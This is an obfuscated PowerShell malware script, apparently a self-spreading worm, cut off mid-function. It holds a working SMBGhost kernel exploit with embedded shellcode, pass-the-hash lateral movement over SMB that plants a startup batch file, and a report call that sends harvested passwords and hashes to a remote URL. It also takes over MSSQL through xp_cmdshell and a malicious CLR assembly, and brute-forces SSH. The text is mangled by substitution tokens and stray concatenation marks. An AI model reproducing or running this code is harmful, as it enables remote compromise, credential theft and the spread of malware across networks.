						if (lzSearchMatch[1] > 0)

						{

							if (destPointer + 2 >= compressedLength)

							{

								return -1;

							}

							bitFlag uOva= (byte)(1 << i);

							int rawOffset = lzSearchMatch[0];

							int rawLength = lzSearchMatch[1];

							int convertedOffset = (rawOffset - 1) << lengthBits;

							int convertedSize = (rawLength - 3) & ((1 << lengthMask) - 1);

							ushort convertedData = (ushort)(convertedOffset uOva convertedSize);

							WriteBytesLittleEndian(convertedData, compressed, compressedOffset + (int)destPointer);

							lzDictionary.AddEntryRange(source, sourceOffset + subBlock, (int)(sourcePointer - subBlock), lzSearchMatch[1]);

							sourcePointer += (uint)lzSearchMatch[1];

							destPointer += 2;

							compressedSize += 2;

						}

						else

						{

						'+'	if (destPointer + 1 >= compressedLength)

							{

								return -1;

							}

							bitFlag uOva= (byte)(0 << i);

							if (source[sourceOffset + sourcePointer] != 0)

							{

								nonZeroDataFound = true;

							}

							compressed[compressedOffset + destPointer] = source[sourceOffset + sourcePointer];

							lzDictionary.AddEntry(source, sourceOffset + subBlock, (int)(sourcePointer - subBlock));

							sourcePointer++;

							destPointer++;

							compressedSize++;

						}

						if (sourcePointer - subBlock >= decompressedSize)

						{

							break;

						}

					}

					compressed[compressedOffset + flagPosition] = bitFlag;

				}

				if (compressedSize >= BlockSize && !isevil)

				{

					WriteBytesLittleEndian((ushort)(0x3000 uOva (BlockSize - 1)), compressed, compressedOffset + (int)headerPosition);

					Array.Copy(sour'+'ce, sourceOffset + sourceCurrentBlock, compressed, compressedOffset + headerPosition + 2, BlockSize);

					destPointer = (uint)(headerPosition + 2 + BlockSize);

					compressed[destPointer] = 0;

					compressed[destPointer + 1] = 0;

				}

				else

				{

					WriteBytesLittleEndian((ushort)(0xb000 uOva (compressedSize - 1)), compressed, compressedOffset + (int)headerPosition);

					if(isevil){

						compr'+'essed[destPointer] = 0x37;

						compressed[destPointer + 1] = 0x13;

						destPointer += 2;

					}

				}


				lzDictionary.Reset();

			}

			if (nonZeroDataFound)

			{

				compressedLength = (int)destPointer;

				return compressedLength;

			}

			else

			{

				compressedLength = 0;

				return 0;

			}

		}

 

        private static byte[] CalcCompressionBits()

        {

            byte[] result = new byte[4096];

            byte offsetBits = 0;

            int y = 0x10;

            for (int x = 0; x < result.Length; x++)

            {

                result[x] = (byte)(4 + offsetBits);

                if (x == y)

                {

                    y <<= 1;

                    offsetBits++;

                }

            }

            return result;

        }

        public static void WriteBytesLittleEndian(ushort val, byte[] buffer, int offset)

        {

            buffer[offset] = (byte)(val & 0xFF);

            buffer[offset + 1] = (byte)((val >> 8) & 0xFF);

        }

        public static ushort ToUInt16LittleEndian(byte[] buffer, int offset)

        {

            return (ushort)(((buffer[offset + 1] << 8) & 0xFF00) uOva ((buffer[offset + 0] << 0) & 0x00FF));

        }

    }

}

utH9@

aDir8d-TYir8pe -TypeDefinition wB69lznt1source 

function smbghost_exec(wB69ip,wB69cmd){

	function unpack(wB69pkt_str) {

		[Byte[]]wB69pkt = for(wB69i=0; wB69i -lt wB69pkt_str.length; wB69i+=2) 

		{ 

		 [Byte][int]::Parse(wB69pkt_str.substring(wB69i,2),utH9HexNumberutH9) 

		} 

		return wB69pkt

	}

	function pack(wB69pkt) {

		wB69pkt uOva foreach{wB69s+=wB69_.ToString(NDckx2NDck)}

		return wB69s

	}

	wB69global:PML4 = 0

	wB69global:PHAL_HEAP = 0

	wB69global:PML4_SELFREF = 0

	wB69global:PHALP_INTERRUPT = 0

	wB69global:PHALP_APIC_INTERRUPT = 0

	wB69global:KERNEL_SHELLCODE = unpack NDck4150415141554157415651525356574c8d35b5020000498b86d8000000498b9ee0000000488918fb4831c9440f22c1b9820000c00f322500f0ffff48c1e2204801d0482d001000006681384d5a75f34989c74d893ebf787cf4dbe8e40000004989c5bf3f5f6477e8380100004889c1bfe1140117e82b0100004889c24883c208498d740d00e8090100003dd883e03e740a4d8b6c15004929d5ebe5bf48b818b84c89e9e89b000000498946084d8b45304d8b4d384981e8f80200004831f64981e9f8020000418b79740fbae70473054c89ceeb0c4d39c84d8b890003000075de4885f67449498d4e104889f24d31c04c8d0dc200000052415041504150bfc45c196d4883ec20e8380000004883c440498d4e10bf3446ccaf4883ec20b805000000440f22c0e8190000004883c420fa4889d85f5e5b5a59415e415f415d41594158ffe0e802000000ffe0535156418b473c4c01f88b80880000004c01f8508b48188b58204c01fbffc98b348b4c01fee81f00000039f875ef588b58244c01fb668b0c4b8b581c4c01fb8b048b4c01f85e595bc35231c099acc1ca0d01c285c075f6925ac3e8a1ffffff8078028077050fb64003c38b4003c3415741565756488b050e010000488b4818488b4920488b09668379481875f6488b415081780c3300320075e94c8b7920bf5e515e83e858ffffff4989c64c8b3dcf00000031c0488d159601000089c148f7d14989c0b04050c1e006504989014883ec20bfea996e57e81effffff4883c430488b3d6b010000488d3577000000b91d000000f3a4488d356e010000b958020000f3a4488d0de000000065488b1425880100004d31c04c8d0d4600000041506a01488b052a0100005041504883ec20bfc45c196de8c1feffff4883c440488d0da60000004c89f24d31c9bf3446ccaf4883ec20e8a2feffff4883c4205e5f415e415fc390c3489231c951514989c94c8d050d00000089ca4883ec20ffd04883c430c35858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585'+'85858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858580000000000000000NDck

	wB69global:USER_PAYLOAD = unpack NDckfc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5636d64202f63206563686f206f6b203e633a2f732e747800NDck

	function reconnect(){

		try{

			wB69client = NEW-objEcT Net.Sockets.TcpClient(wB69ip,445)

			wB69sock = wB69client.Client

		}catch{

			write-host(NDck[*] Cannot connect to wB69{ip}:445NDck)

		}

		return wB69sock

	}

	function sock_recv(wB69sock) {

		wB69sock.ReceiveTimeout = 5000

		try{

			wB69res = [Array]::CreateInstance((utH9bytutH9+utH9eutH9), 1000)

			wB69recv = wB69sock.Receive(wB69res)

			return wB69res[0..(wB69recv-1)]

		}catch{

            write-host(NDck[*] Cannot receive data from remoteNDck)

            return wB69false

        }

	}

	function smb_negotiate(wB69sock){

		wB69pkt_str=utH9000000b2fe534d424000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002400050000000000440000001337c0de1337c0de1337c0de1337c0de700000000200000002021002000302031103000001002600000000000100200001000000000000000000000000000000000000000000000000000000000000000000000003000a000000000001000000010000000100utH9

		wB69pkt=unpack wB69pkt_str

		wB69sock.send(wB69pkt)

	}

	function Smb2CompressedTransform(wB69compressed_data, wB69decompressed_size, wB69data){

		wB69pkt = @(0xfc,0x53,0x4d,0x42)

		wB69pkt += [bitconverter]::GetBytes(wB69decompressed_size)

		wB69pkt += @(0x01,0x00,0x00,0x00)

		wB69pkt += [bitconverter]::GetBytes(wB69data.length)

		wB69pkt += wB69data + wB69compressed_data

	}

	function smb_compress(wB69sock, wB69compressed_data, wB69decompressed_size, wB69data){

		wB69comp_bytes = @(0xfc,0x53,0x4d,0x42)

		wB69comp_bytes += [bitconverter]::GetBytes(wB69decompressed_size)

		wB69comp_bytes += @(0x01,0x00,0x00,0x00)

		wB69comp_bytes += [bitconverter]::GetBytes(wB69data.length)

		wB69comp_bytes += wB69data + wB69compressed_data

		wB69compressed_packet = @(0x00) + [bitconverter]::GetBytes(wB69comp_bytes.length)[2..0] + wB69comp_bytes

		wB69sock.send(wB69compressed_packet)

	}

	function MDL(wB69phys_addr){

		wB69pkt_str=utH9000000000000000048001c500000000000000000000000000008000080f7ffff0000000080f7ffff58020000utH9

		wB69phys_addr_enc = (wB69phys_addr -band 0xFFFFFFFFFFFFF000)/4096

		wB69pkt = unpack wB69pkt_str

		wB69pkt += [bitconverter]::GetBytes([int](wB69phys_addr -band 0xFFF)+0x4)

		wB69pkt += [bitconverter]::GetBytes([int64]wB69phys_addr_enc)*3

		return wB69pkt

	}

	function write_primitive(wB69data,wB69addr){

		wB69sock = reconnect

		if(wB69sock -eq wB69null){

			return wB69false

		}

		smb_negotiate wB69sock uOva out-null

		sock_recv wB69sock uOva out-null

		wB69uncompressed_data = @(0x41)*(0x1100-wB69data.length)

		wB69uncompressed_data += @(0x00)*0x18

		wB69uncompressed_data += [bitconverter]::GetBytes([int64]wB69addr)

		wB69compressed_data = @(0x00) * [math]::max(wB69uncompressed_data.length,100)

		wB69compressed_length=(new-object Compression.LZNT1).Compress(wB69uncompressed_data,[ref]wB69compressed_data,wB69false)

		wB69compressed_data = wB69compressed_data[0..(wB69compressed_length-1)]

		smb_compress wB69sock wB69compressed_data 0xFFFFFFFF wB69data uOva out-null

		wB69sock.close()

	}

	function write_srvnet_buffer_hdr(wB69data, wB69offset){

		wB69sock = reconnect

		if(wB69sock -eq wB69null){

			return wB69false

		}

		smb_negotiate wB69sock uOva out-null

		sock_recv wB69sock uOva out-null

		

		wB69compressed_data = @(0x00) * [math]::max(wB69data.length,100)

		wB69compressed_length=(new-object Compression.LZNT1).Compress(wB69data,[ref]wB69compressed_data,wB69true)

		wB69compressed_data = wB69compressed_data[0..(wB69compressed_length-1)]

		wB69dummy_data = @(0x33)*(0x1100+wB69offset)

		smb_compress wB69sock wB69compressed_data 0xFFFFEFFF wB69dummy_data uOva out-null

		wB69sock.close()

	}

	function read_physmem_primitive(wB69phys_addr){

		wB69retry=3

		while(wB69retry-- -gt 0){

			wB69fake_mdl = MDL wB69phys_addr

			wB69flag33 = write_primitive wB69fake_mdl (0xFFFFF78000000000+0x900)

			if(wB69flag33 -eq wB69false){return}

		

			wB69flag33=write_srvnet_buffer_hdr ([bitconverter]::GetBytes([int64](0xFFFFF78000000000+0x900))) 0x38

			if(wB69flag33 -eq wB69false){return}

			wB69retry1=3

			while(wB69retry1-- -gt 0){

				wB69sock = reconnect

				if(wB69sock -eq wB69null){

					return

				}

				smb_negotiate wB69sock uOva out-null

				wB69buff = sock_recv wB69sock

				wB69sock.close() uOva out-null

				if(compare wB69buff[4..7] @(0xfe,0x53,0x4d,0x42)){

					return wB69buff

				}

			}

		}

	}

	function get_phys_addr(wB69va_addr){

		wB69pml4_index = 511 -band ([math]::floor(wB69va_addr/[math]::pow(2,39)))

		wB69pdpt_index = 511 -band ([math]::floor(wB69va_addr/[math]::pow(2,30)))

		wB69pdt_index = 511 -band ([math]::floor(wB69va_addr/[math]::pow(2,21)))

		wB69pt_index = 511 -band ([math]::floor(wB69va_addr/[math]::pow(2,12)))

		wB69pml4e = wB69global:PML4 + wB69pml4_index*0x8

		wB69pdpt_buff = read_physmem_primitive wB69pml4e

		if(wB69pdpt_buff -eq wB69null){

			write-host(NDck[-] physical read primitive failedNDck)

			return

		}

		wB69pdpt = [bitconverter]::toin'+'t64(wB69pdpt_buff[0..7],0) -band 4294963200

		wB69pdpte = wB69pdpt + wB69pdpt_index*0x8

		wB69pdt_buff = read_physmem_primitive wB69pdpte


		if(wB69pdt_buff -eq wB69null){

			write-host(NDck[-] physical read primitive failedNDck)

			return

		}

		wB69pdt = [bitconverter]::toint64(wB69pdt_buff[0..7],0) -band 4294963200

		wB69pdte = wB69pdt + wB69pdt_index*0x8

		wB69pt_buff = read_physmem_primitive wB69pdte

		

		if(wB69pt_buff -eq wB69null){

			write-host(NDck[-] physical read primitive failedNDck)

			return

		}

		wB69pt = [bitconverter]::toint64(wB69pt_buff[0..7],0)

		

		if(wB69pt -band 128){

			wB69phys_addr = (wB69pt -band 4294963200) + (wB69pt_index -band 0xFFF)*0x1000 + (wB69va_addr -band 0xFFF)

			return wB69phys_addr

		} else {

			wB69pt = wB69pt -band 4294963200

		}

		

		wB69pte = wB69pt + wB69pt_index*0x8

		wB69pte_buff = read_physmem_primitive wB69pte

		if(wB69pte_buff -eq wB69null){

			write-host(NDck[-] physical read primitive failedNDck)

			return

		}

		wB69phys_addr = ([bitconverter]::toint64(wB69pte_buff[0..7],0) -band 4294963200) + (wB69va_addr -band 0xFFF)

		return wB69phys_addr

	}

	

	function get_pte_va(wB69addr){

		wB69pt = 36028778765352960

		wB69lb = 0xFFFF000000000000 -bor (wB69global:PML4_SELFREF * [math]::pow(2,39))

		wB69ub = (0xFFFF000000000000 -bor (wB69global:PML4_SELFREF * [math]::pow(2,39) + 0x8000000000 - 1)) -band 0xFFFFFFFFFFFFFFF8

        wB69pt = wB69pt -bor wB69lb

		wB69pt = wB69pt -band wB69ub

        

		return wB69pt

	}

	function overwrite_pte(wB69addr){

		wB69phys_addr = get_phys_addr wB69addr

		wB69buff = read_physmem_primitive wB69phys_addr

		if(wB69buff -eq wB69null){

			write-host(NDck[-] read primitive failed!NDck)

			return wB69false

		}

		wB69pte_val = [bitconverter]::toint64(wB69buff[0..7],0)

		wB69overwrite_val = wB69pte_val -band 9223372036854775807

		wB69overwrite_buff = [bitconverter]::GetBytes([int64]wB69overwrite_val)

		write_primitive wB69overwrite_buff wB69addr

	}

	function build_shellcode(){

		wB69global:KERNEL_SHELLCODE += [bitconverter]::GetBytes([int64](wB69global:PHALP_INTERRUPT+0x78))

		wB69global:KERNEL_SHELLCODE += [bitconverter]::GetBytes([int64]wB69global:PHALP_APIC_INTERRUPT)

		wB69global:KERNEL_SHELLCODE += wB69global:USER_PAYLOAD

	}

	function search_hal_heap(){

		wB69search_len = 0x10000

		wB69index = wB69global:PHAL_HEAP

		wB69page_index = wB69global:PHAL_HEAP

		wB69cons = 0

		wB69phys_addr = 0

		

		while(wB69index -lt (wB69global:PHAL_HEAP + wB69search_len)){

			if(-not (wB69index -band wB690xFFF)){

				wB69phys_addr = get_phys_addr wB69index

				if(wB69phys_addr -eq wB69null){

					return wB69false

				}

			} else {

				wB69phys_addr = (wB69phys_addr -band 0xFFFFFFFFFFFFF000) + (wB69index -band 0xFFF)

			}


			wB69buff = read_physmem_primitive wB69phys_addr

			if(wB69buff -eq wB69null){

				write-host(NDck[-] physical read primitive failed!NDck)

				return wB69false

			}

			

			[int]wB69entry_indices = 8*([math]::floor((wB69buff.length+4)/8)-1)

			wB69i = 0

			while(wB69i -lt wB69entry_indices){

				wB69entry = [bitconverter]::toint64(wB69buff[wB69i..(wB69i+7)],0)

				wB69i += 8

				if((wB69entry -band 0xFFFFFF0000000000) -ne 0xFFFFF80000000000){

					wB69cons = 0

					continue

				}

				wB69cons += 1

				if(wB69cons -gt 3){

					wB69global:PHALP_INTERRUPT = wB69index + wB69i - 0x40

					write-host(NDck[+] found HalpInterruptController at 0x{0:x}NDck -f wB69global:PHALP_INTERRUPT)

					

					if(wB69buff.length -lt (wB69i+0x40)){

						wB69buff = read_physmem_primitive (wB69phys_addr + wB69i + 0x38)

						wB69global:PHALP_APIC_INTERRUPT = [bitconverter]::toint64(wB69buff[0..7],0)

						if(wB69buff -eq wB69null){

							write-host(NDck[-] physical read primitive failed!NDck)

							return wB69false

						}

					} else {

						wB69global:PHALP_APIC_INTERRUPT = [bitconverter]::toint64(wB69buff[(wB69i+0x38)..(wB69i+0x3f)],0)

					}

					write-host(NDck[+] found HalpApicRequestInterrupt at 0x{0:x}NDck -f wB69global:PHALP_APIC_INTERRUPT)

					return wB69true

				}

			}

			wB69index += wB69entry_indices

		}

		write-host(NDck[-] failed to find HalpInterruptController!NDck)

	}

	function search_selfref(){

		wB69search_len = 0x1000

		wB69index = wB69global:PML4

		while(wB69search_len){

			wB69buff = read_physmem_primitive wB69index

			if(wB69buff -eq wB69null){

				return

			}

			[int]wB69entry_indices = 8*([math]::floor((wB69buff.length+4)/8)-1)

			wB69i = 0

			while(wB69i -lt wB69entry_indices){

				wB69entry = [bitconverter]::toint64(wB69buff[wB69i..(wB69i+7)],0) -band 4294963200

				if(wB69entry -eq wB69global:PML4){

					return (wB69index+wB69i)

				}

				wB69i += 8

			}

			wB69search_len -= wB69entry_indices

			wB69index += wB69entry_indices

		}

	}

	function find_pml4_selfref(){

		wB69self_ref = search_selfref

		if(wB69self_ref -eq wB69null){

			write-host(NDck[-] failed to find PML4 self reference entry!NDck)

			return wB69false

		}

		[int]wB69global:PML4_SELFREF = [math]::floor((wB69self_ref -band 0xFFF)/8)

		write-host(NDck[+] found PML4 self-ref entry {0:x}NDck -f (wB69global:PML4_SELFREF)'+')

		return wB69true

	}

	function find_low_stub(){

		wB69limit = 0x100000

		wB69index = 0x1000

		while(wB69index -lt wB69limit){

			wB69buff1 = read_physmem_primitive wB69index

			if(wB69buff1 -eq wB69null){

				write-host(NDck[-] physical read primitive failed!NDck)

				return wB69false

			}

			wB69entry = [bitconverter]::toint64(wB69buff1[0..7],0) -band 0xFFFFFFFFFFFF00FF

			if(wB69entry -eq 0x1000600E9){

				write-host(NDck[+] found low stub at phys addr 0x{0:x}!NDck -f wB69index)

				wB69global:PML4 = [bitconverter]::toint64(wB69buff1[160..167],0)

				write-host(NDck[+] PML4 at 0x{0:x}NDck -f wB69global:PML4)

				wB69global:PHAL_HEAP = [bitconverter]::toint64(wB69buff1[120..127],0) -band 0xFFFFFFFFF0000000

				write-host(NDck[+] base of HAL heap at 0x{0:x}NDck -f wB69global:PHAL_HEAP)

				return wB69true

			}

			wB69index += 0x1000

		}

		write-host(NDck[-] Failed to find low stub in physical memory!NDck)

	}

	function do_rce(){

		wB69flag = find_low_stub

		if(wB69flag -ne wB69true){

			return wB69false

		}

		wB69flag1 = find_pml4_selfref

		if(wB69flag1 -ne wB69true){

			return wB69false

		}

		wB69flag2 = search_hal_heap

		if(wB69flag2 -ne wB69true){

			return wB69false

		}

		build_shellcode

		write-host(NDck[+] built shellcode!NDck)

		

		wB69pKernelUserSharedPTE = get_pte_va

		write-host(NDck[+] KUSER_SHARED_DATA PTE at 0x{0:x}NDck -f wB69pKernelUserSharedPTE)

		

		wB69flag3 = overwrite_pte wB69pKernelUserSharedPTE

		if(wB69flag3 -eq wB69false){

			return wB69false

		}

		write-host(NDck[+] KUSER_SHARED_DATA PTE NX bit cleared!NDck)

		

		wB69to_write = wB69global:KERNEL_SHELLCODE.length

		wB69write_bytes = 0

		while(wB69write_bytes -lt wB69to_write){

			wB69write_sz = [math]::min(0xd0, wB69to_write - wB69write_bytes)

			write_primitive wB69global:KERNEL_SHELLCODE[wB69write_bytes..(wB69write_bytes + wB69write_sz-1)] (0xFFFFF78000000000+0x950+wB69write_bytes)

			wB69write_bytes += wB69write_sz

		}

		write-host(NDck[+] Wrote shellcode at 0x{0:x}!NDck -f (0xFFFFF78000000000+0x950))

		write_primitive ([bitconverter]::GetBytes([int64](0xFFFFF78000000000+0x950))) (wB69global:PHALP_INTERRUPT + 0x78)

		write-host(NDck[+] overwrote HalpInterruptController pointer, should have execution shortly...NDck)

		return wB69true

	}

    if(wB69cmd -ne wB69null){

        wB69global:USER_PAYLOAD = wB69global:USER_PAYLOAD[0..266] + [Text.Encoding]::ASCII.GetBytes(wB69cmd) +@(0x00)

    }

	do_rce

}

function copyrun {   

	Param(

    [parameter(Mandatory=wB69true)][String]wB69ip,

	[parameter(Mandatory=wB69true)][String]wB69thedomain,

    [parameter(Mandatory=wB69true)][String]wB69user,

	[parameter(Mandatory=wB69true)][String]wB69cmd

	)

	if(wB69thedomain -eq utH9localhostutH9){

		wB69ipchash = wB69allhash

	}else{

		wB69ipchash = wB69gethashs

	}

	for(wB69i = 0; wB69i -lt wB69ipchash.Count; wB69i++){

		try{

            wB69list_rst = NDckNDck

			wB69list_rst = Invoke-SMBC -Domain wB69thedomain -Username wB69user -Hash wB69ipchash[wB69i] -Action List -Source 9e09e0wB69ip9e0users -verbose

			if(wB69list_rst.IndexOf(NDckfailed to authenticateNDck) -eq -1){

				try{    

					wB69exec_rst=NDckNDck

                    if(wB69thedomain -eq utH9localhostutH9){

                        if(wB69i -lt wB69allpass.count){

                            wB69currpass = wB69allpass[wB69i]

                        } else { 

                            wB69currpass = NDckunknownNDck

                        }

                    }else{

                        wB69currpass = wB69getpasswd[wB69i]

                    }

                    write-host wB69currpass

                    wB69internet_ip = (Test-Connection -ComputerName wB69env:computername -count 1).ipv4address.IPAddressToString

					wB69exec_rst = Invoke-SE -Target wB69ip -Domain wB69thedomain -Username wB69user -Hash wB69ipchash[wB69i] -Command wB69cmd 

                    write-host wB69exec_rst

                    if(wB69exec_rst.IndexOf(NDckCommand executedNDck) -ne -1){

                        try{(New-Object Net.WebClient).DownloadString(wB69down_url+utH9/report.json?v=utH9+wB69VVERSION+utH9&type=ipc&iip=utH9+wB69internet_ip+utH9&ip=utH9+wB69ip+utH9&domain=utH9+wB69thedomain+utH9&user=utH9+wB69user+utH9&pass=utH9+wB69currpass+utH9&passhash=utH9+wB69ipchash[wB69i]+utH9&t=utH9+wB69t)}catch{}

                        return    

                    }                   

				}catch{

				}

                    

				wB69list_rst = Invoke-SMBC -Domain wB'+'69thedomain -Username wB69user -Hash wB69ipchash[wB69i] -Action NDckListNDck -Source 9e09e0wB69ip9e0cwB699e0users -verbose

				wB69list_rst

				wB69users=@()

				wB69items=wB69list_rst.split(NDck9e0NDck)

				for(wB69j=5;wB69j -lt wB69items.length;wB69j+=5){

				wB69items1=wB69items[wB69j].split(NDckir8nNDck)

				if(wB69items1.length -eq 2){

					wB69user1=wB69items1[0].trim()

				}

				if(wB69items1.length -eq 3){

					wB69user1=wB69items1[0].trim()+wB69items1[1].trim()

				}

				wB69users+=wB69user1

				}

				wB69users=wB69usersuOvaselect -uniq

				wB69users

				for (wB69k=0; wB69k -lt wB69users.Count; wB69k++ ){

					wB69bat_pa'+'th = NDck9e09e0wB69ip9e0cwB699e0users9e0NDck+wB69users[wB69k].trim()+utH99e0AppData9e0Roaming9e0Microsoft9e0Windows9e0Start Menu9e0Programs9e0Startup9e0run.batutH9 

					Invoke-SMBC -Domain wB69domain -Username wB69user -Hash wB69ipchash[wB69i] -Action Delete -Source NDckwB69bat_pathNDck

					Invoke-SMBC -Domain wB69domain -Username wB69user -Hash wB69ipchash[wB69i] -Action Put -Source wB69byte_bat -Destination NDckwB69bat_pathNDck -Modify


				}

				break

			}

		}catch{}

	}

}


function db_query{

	Param(

    [parameter(Mandatory=wB69true)][System.Data.SqlClient.SqlConnection]wB69sqlconnection,

	[parameter(Mandatory=wB69true)][String]wB69sqlcommand

	)

	wB69SqlCmd = New-Object System.Data.SqlClient.SqlCommand

	wB69SqlCmd.CommandText = wB69sqlcommand

	wB69SqlCmd.Connection = wB69SqlConnection 

	wB69SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter

	wB69SqlAdapter.SelectCommand = wB69SqlCmd 

	wB69DataSet = New-Object System.Data.DataSet

	wB69SqlAdapter.Fill(wB69DataSet) uOva out-null

	#wB69DataSet.Tables[0] uOva Format-Table -Auto

	return wB69DataSet.Tables[0].Rows[0]

}

function db_gencmd{

    Param(

	[parameter(Mandatory=wB69true)][String]wB69rawcmd

	)

    wB69sqlcmd = NDckNDck

    wB69m_count = [Math]::Ceiling(wB69cmd.length/128)

    for(wB69i=0;wB69i -lt wB69m_count;wB69i++){

        wB69sqlcmd += NDckDECLARE @cmdwB69i VARCHAR(256)=utH9NDck+wB69rawcmd.substring(wB69i*128,[math]::min(128,wB69cmd.length-wB69i*128)).replace(NDckutH9NDck,NDckutH9utH9NDck)+NDckutH9;NDck

    }

    wB69sqlcmd += NDckDECLARE @cmd VARCHAR(2000)=@cmd0NDck

    for(wB69i=1;wB69i -lt wB69m_count;wB69i++){

        wB69sqlcmd += NDck+@cmdwB69iNDck

    }

    wB69sqlcmd += NDck;exec xp_cmdshell @cmdNDck

    return wB69sqlcmd

}

function mssqlrun {

	Param(

    [parameter(Mandatory=wB69true)][String]wB69ip,

	[parameter(Mandatory=wB69true)][String]wB69pass,

	[parameter(Mandatory=wB69true)][String]wB69cmd,

	[parameter(Mandatory=wB69false)][String]wB69cmd1

	)

	wB69banner=NDckNDck

	wB69SqlConnection = New-Object System.Data.SqlClient.SqlConnection

	wB69SqlConnection.ConnectionString = NDckServer = wB69ip; Database = master ; User ID= sa; Password= wB69passNDck 

	try{

		wB69sqlconnection.open()uOvaout-null

		write-host NDckGet sa pass:wB69passNDck

	}catch{

		write-host(wB69ERROR[0])

		return wB69false,wB69banner

	}	

	

	try{

		wB69ret = db_query -sqlconnection wB69sqlconnection -sqlcommand NDckSELECT service_account,@@version FROM sys.dm_server_services where servicename like utH9SQL Server%utH9 and servicename not like utH9%Agent%utH9 and status_desc=utH9RunningutH9NDck

		wB69version=wB69ret[1].replace(NDckir8nNDck,NDckNDck).replace(NDckir8rNDck,NDckNDck)

		if(wB69version -match NDckMicrosoft SQL Server ([9e0d9e0.]+).+on Windows (.+)NDck){

			wB69banner = @(wB69ret[0],wB69matches[1],wB69matches[2])-joinNDck_NDck

		} else {

			wB69banner = @(wB69ret[0],wB69version)-joinNDck_NDck

		}

	}catch{

		write-host NDckselect version error:NDck

		write-host wB69ERROR[0]

	}

	

	try{db_query -sqlconnection wB69sqlconnection -sqlcommand NDckexec sp_dropextendedproc utH9xp_cmdshellutH9;NDck}catch{

		write-host NDcksp_dropextendedproc error:NDck

		write-host wB69ERROR[0]

	}

	try{db_query -sqlconnection wB69sqlconnection -sqlcommand NDckdbcc addextendedproc(utH9xp_cmdshellutH9,utH9xplog70.dllutH9);NDck}catch{

		write-host NDckaddextendedproc error:NDck

		write-host wB69ERROR[0]

	}

	try{db_query -sqlconnection wB69sqlconnection -sqlcommand NDckEXEC sp_configure utH9show advanced optionsutH9, 1;RECONFIGURE;exec SP_CONFIGURE utH9xp_cmdshellutH9, 1;RECONFIGURE;NDck}catch{

		write-host NDcksp_configure error:NDck

		write-host wB69ERROR[0]

	}

	try{

        wB69sqlcmd = db_gencmd -rawcmd wB69cmd

		db_query -sqlconnection wB69sqlconnection -sqlcommand wB69sqlcmd

	}catch{

		write-host NDckxp_cmdshell error:NDck

		write-host wB69ERROR[0]

	}

	

	try{db_query -sqlconnection wB69sqlconnection -sqlcommand NDcksp_configure utH9clr enabledutH9,1;RECONFIGURE WITH OVERRIDENDck}catch{

		write-host NDcksp_configure error:NDck

		write-host wB69ERROR[0]

	}

	try{db_query -sqlconnection wB69sqlconnection -sqlcommand NDckALTER DATABASE master SET TRUSTWORTHY ONNDck}catch{

		write-host NDckALTER DATABASE error:NDck

		write-host wB69ERROR[0]

	}

	try{db_query -sqlconnection wB69sqlconnection -sqlcommand NDckCREATE ASSEMBLY [evilclr] AUTHORIZATION [dbo] FROM 0xck}catch{

		write-host NDckCREATE ASSEMBLY error:NDck

		write-host wB69ERROR[0]

	}

	try{db_query -sqlconnection wB69sqlconnection -sqlcommand NDckCREATE PROCEDURE [dbo].[ExecCommand] @cmd NVARCHAR (MAX) AS EXTERNAL NAME [evilclr].[StoredProcedures].[ExecCommand]NDck}catch{

		write-host NDckCREATE PROCEDURE error:NDck

		write-host wB69ERROR[0]

	}

	try{

        wB69sqlcmd = db_gencmd -rawcmd wB69cmd1

        db_query -sqlconnection wB69sqlconnection -sqlcommand wB69sqlcmd

    }catch{

		write-host NDckexec dbo.execcommand error:NDck

		write-host wB69ERROR[0]

	}

	

	wB69SqlConnection.Close() 

	return wB69true,wB69banner

}


function sshbrute(wB69ip,wB69user,wB69pass,wB69ssh_cmd){

	if(!(test-path wB69plinkexepath)){

		return 0

	}

	wB69global:flag = -1

	wB69process = New-Object System.Diagnostics.Process

	

	if(wB69global:ssh_ip_cache -notcontains NDckwB69ip_wB69userNDck){

		wB69global:ssh_ip_cache+=NDckwB69ip_wB69userNDck

		wB69process.StartInfo.FileName = NDckc:9e0windows9e0system329e0cmd.exeNDck

		wB69process.StartInfo.Arguments = NDck/c echo yuOvawB69plinkexepath wB69user@wB69ip -pw wB69pass -v NDckNDckwB69ssh_cmdNDckNDckNDck

	} else {

		wB69process.StartInfo.FileName = wB69plinkexepath

		wB69process.StartInfo.Arguments = NDckwB69user@wB69ip -pw wB69p'+'ass -v NDckNDckwB69ssh_cmdNDckNDckNDck

	}

	wB69process.StartInfo.UseShellExecute = wB69false

	wB69process.StartInfo.CreateNoWindow = wB69true

	wB69process.StartInfo.RedirectStandardInput = wB69true

	wB69process.StartInfo.RedirectStandardOutput = wB69true

	wB69process.StartInfo.RedirectStandardError = wB69true

	

	wB69sScripBlock = {

        if (! [String]::IsNullOrEmpty(wB69EventArgs.Data)) {

            wB69Event.MessageData.AppendLine(wB69EventArgs.Data)

			if(wB69EventArgs.Data.IndexOf(NDckauthentication failedNDck) -ne -1){

				wB69global:flag = 0

			}

			if(wB69EventArgs.Data.IndexOf(NDckAccess grantedNDck) -ne -1){

				wB69global:flag = 1

				wB69process.StandardInput.WriteLine(NDckir8nNDck)

				wB69process.StandardInput.Close()

			}

        }

    }

	

	wB69oStdErrEvent = Register-ObjectEvent -InputObject wB69process -Action wB69sScripBlock -EventName utH9ErrorDataReceivedutH9 -MessageData (New-Object -TypeName System.Text.StringBuilder)

	wB69oStdOutputEvent = Register-ObjectEvent -InputObject wB69process -Action wB69sScripBlock -EventName utH9OutputDataReceivedutH9 -MessageData (New-Object -TypeName System.Text.StringBuilder)

	

	wB69process.Start()uOvaout-null

	wB69process.BeginErrorReadLine()

	wB69process.BeginOutputReadLine()

		

	wB69count=50

	while(wB69true){

		if'+'(wB69process.HasExited){

